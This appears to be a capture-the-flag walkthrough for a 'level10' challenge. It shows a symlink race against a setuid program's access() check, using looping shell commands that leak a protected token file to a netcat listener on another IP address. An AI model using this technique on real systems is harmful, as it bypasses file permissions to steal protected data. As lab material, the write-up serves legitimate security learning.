If we do `strings level10` we can see that the progam seems to send a file to a host on its port 6969, once it is sent, it opens it, reads it, and write it.

We don't have permission to `cat token`, so maybe we can send `token` with `level10` program on a host and read it once `level10` wrote `token`.

How to do that?

`If you want to create a simple "test" server that can be set listen on a specified port and that you can interact with, take a look at the netcat command`
https://askubuntu.com/questions/301787/opening-a-port-for-listening

` [netcat] can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6.`
`nc -l      Listen for an incoming connection rather than initiating a connection to a remote
             host.  The destination and port to listen on can be specified either as non-optional
             arguments, or with options -s and -p respectively.`
http://manpages.ubuntu.com/manpages/hirsute/en/man1/nc_openbsd.1.html


So we can start to execute level10 with token on our IP address: `./level10 token 10.12.0.0` but it does not work as we don't have access to token. </br>
Let's do a symlink on token: `ln -s /home/user/level10/token /tmp/final`and try `./level10 /tmp/final 10.12.0.0` -> It does not work as we don't have access to /tmp/final.


First ssh terminal: `while true; do (./level10 /tmp/final 10.11.200.134); done`

Second ssh terminal: `while true; do nc -l 6969 ;done`

`readlink -f token` to know true token path

third ssh terminal: `while true; do rm -rf /tmp/final; touch /tmp/final; ln -sfn /home/user/level10/token /tmp/final; done`

If you don't rm and touch /tmp/final the symlink is on put final and you ./level10 will say you don't have access to /tmp/final, you need a new file created by you to pass the access() check and then apply symlink to /tmp/final
